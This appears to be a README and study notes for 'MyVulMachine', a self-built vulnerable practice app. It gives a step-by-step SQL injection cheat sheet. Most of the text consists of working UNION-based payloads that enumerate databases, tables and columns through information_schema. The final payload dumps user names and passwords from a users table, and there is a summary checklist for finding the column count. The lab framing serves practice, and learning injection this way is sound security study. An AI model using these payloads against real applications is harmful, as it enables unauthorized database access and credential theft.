# MyVulMachine full code 
it has many mode to practice sql injection:



**cheat code **
Cheat
TABLE_SCHEMA=> TELL YOU DATABASE NAME
TABLE_NAME => TELL YOU TABLE NAME
TABLE_TYPE => TELL YOU TYPE (BASE TYPE OR,….)
SCHEMA_NAME => IT WILL GIVE YOU THE DATABASE NAME (USE WHEN SCHEMATA IS USED WITH INFORMATION_SCHEMA )
COLUMN_NAME => tell you column name

INFORMATION_SCHEMA.TABLES 

INFORMATION_SCHEMA.SCHEMATA

INFORMATION_SCHEMA.COLUMNS => by using this I can find database name, table name and column name     (table_schema,table_name,column_name)



Note:
	WHAT YOU UNDERSTAND BY LINE “information_schema.tables”
		Ans: here information_schema is database and
 tables is the metadata of table that represent all table inside database

1)Table_schema & table_name is a column of tables of database INFORMATION_SCHEMA


information_schema.tables
TABLE_CATALOG
TABLE_SCHEMA 
TABLE_NAME 
TABLE_TYPE
---------------------------------------------------------------------------------
information_schema.columns
TABLE_CATALOG 
TABLE_SCHEMA 
TABLE_NAME 
COLUMN_NAME 
DATA_TYPE
---------------------------------------------------------------------------------------------------------------------------------------------------------




1)**To Get only database**
To get DATABAE name use 
   SCHEMA_NAME in between SELECT and FROM
  INFORMATION_SCHEMA.SCHEMATA after FROM 

SELECT first_name, last_name FROM users WHERE user_id=0'UNION SELECT SCHEMA_NAME , NULL FROM INFORMATION_SCHEMA.SCHEMATA;

**Use this on MVA to get database-> 
**0'UNION SELECT SCHEMA_NAME , NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -
Note: this query will show all the database present in phpmyadmin

**To Get Database & table name**
    To get TABLE name use 
       TABLE_SCHEMA in between SELECT and FROM
      INFORMATION_SCHEMA.TABLES after FROM 

SELECT first_name, last_name FROM users WHERE user_id='0'UNION SELECT TABLE_SCHEMA, table_name FROM information_schema.tables;

****Use this on MVA to get database & table name-> ****
0'UNION SELECT TABLE_SCHEMA, table_name FROM information_schema.tables-- -

**2)To Get Table Name:**
    find table_name (If you have databse name )
    To get table name use 
         TABLE_NAME in between SELECT and FROM
        INFORMATION_SCHEMA.TABLES after FROM 

SELECT first_name, last_name FROM users WHERE user_id='0' UNION SELECT table_name, table_type FROM information_schema.tables WHERE table_schema='mva'-- -';
**Use this on MVA to get table name**-
0' UNION SELECT table_name, table_type FROM information_schema.tables WHERE table_schema='mva'-- -

NOW I HAVE
	DATABASE: mva
	Table name:users

3)To get all Column (inside user table we use this query):
To get column name use 
 COLUMN_NAME in between SELECT and FROM
INFORMATION_SCHEMA.COLUMNS after FROM 
SELECT first_name, last_name FROM users WHERE user_id='0'union SELECT COLUMN_NAME,null FROM information_schema.columns WHERE table_name = 'Users';
Use this on MVA to get COLUMN name from Table->
0'union SELECT COLUMN_NAME,null FROM information_schema.columns WHERE table_name = 'Users'-- -
4)To fetch ():
Now we have
database name = mva
table name= users
columns(fild/attribue)= user_id , first_name, last_name, user, password

Use this on MVA to get all result from table: ->
0'union SELECT user,password FROM Users-- -



MVA 
1)	Find number of column:
1)order by 2
2)union null, null
2)	Database name:-
0'UNION SELECT SCHEMA_NAME , NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -
3)	Database & table name:-
0'UNION SELECT TABLE_SCHEMA, table_name FROM information_schema.tables-- -
4)	Column name:-
0'union SELECT COLUMN_NAME,null FROM information_schema.columns WHERE table_name = 'Users'-- -
5)fetch:-
0'union SELECT user,password FROM Users-- -



